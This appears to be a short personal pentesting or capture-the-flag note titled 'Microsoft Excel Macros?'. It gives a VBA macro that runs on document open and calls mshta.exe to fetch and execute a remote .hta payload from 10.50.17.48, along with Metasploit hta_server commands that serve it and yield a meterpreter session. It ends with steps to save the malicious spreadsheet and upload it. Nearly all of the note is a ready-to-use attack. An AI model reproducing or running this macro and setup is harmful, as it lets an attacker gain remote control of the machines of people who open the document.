Microsoft Excel Macros?
![[Pasted image 20210517034142.png]]


Creating a macro in Excel.
Macro content:

Note: This macro's .hta file has to be renamed to the one specified in msfconsole. For that, run the commands below it:

```vb
Sub myMacro()
PID = Shell("mshta.exe http://10.50.17.48:8080/CfkPviu1s.hta")
End Sub

Sub Auto_Open()
    myMacro
End Sub
```

```bash
$ sudo msfconsole -q
$ use exploit/windows/misc/hta_server
$ set LPORT 53
$ set LHOST tun0
$ set SRVHOST tun0
$ exploit -j
```

After this, rename to the specified file and save the malicious excel document
Go to the web-server and upload it there.

Once done, you'll have a meterpreter session.